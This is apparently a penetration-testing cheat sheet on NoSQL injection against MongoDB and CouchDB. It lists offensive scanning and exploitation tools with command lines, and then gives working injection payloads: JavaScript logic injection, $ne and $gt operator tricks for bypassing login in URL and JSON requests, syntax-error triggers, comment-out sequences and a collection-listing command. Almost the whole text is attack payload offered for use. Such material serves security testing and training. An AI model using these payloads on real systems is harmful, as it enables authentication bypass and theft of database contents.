# NoSQL \(MongoDB, CouchDB\)

```bash
# Tools
# https://github.com/codingo/NoSQLMap
python NoSQLMap.py
# https://github.com/torque59/Nosql-Exploitation-Framework
python nosqlframework.py -h
# https://github.com/Charlie-belmer/nosqli
nosqli scan -t http://localhost:4000/user/lookup?username=test
# https://github.com/FSecureLABS/N1QLMap
./n1qlMap.py http://localhost:3000 --request example_request_1.txt --keyword beer-sample --extract travel-sample

# Payload: 
' || 'a'=='a

mongodbserver:port/status?text=1

# in URL
username[$ne]=toto&password[$ne]=toto

##in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt":""}, "password": {"$gt":""}}

- Trigger MongoDB syntax error -> ' " \ ; { }
- Insert logic -> ' || '1' == '1' ; //
- Comment out -> //
- Operators -> $where $gt $lt $ne $regex
- Mongo commands -> db.getCollectionNames()
```

